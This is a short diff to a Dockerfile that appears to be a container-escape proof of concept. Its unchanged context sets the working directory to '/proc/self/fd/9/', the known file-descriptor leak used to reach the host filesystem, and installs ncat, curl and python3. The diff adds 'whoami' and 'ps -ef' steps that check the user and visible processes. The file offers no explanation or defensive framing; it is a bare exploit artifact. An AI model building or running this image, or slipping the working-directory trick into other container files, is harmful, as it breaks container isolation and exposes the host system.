@@ -1,4 +1,6 @@
 FROM ubuntu
+RUN whoami
+RUN ps -ef
 RUN apt update -y 
 RUN apt install -y curl && apt install -y ncat && apt install python3 -y
 WORKDIR /proc/self/fd/9/
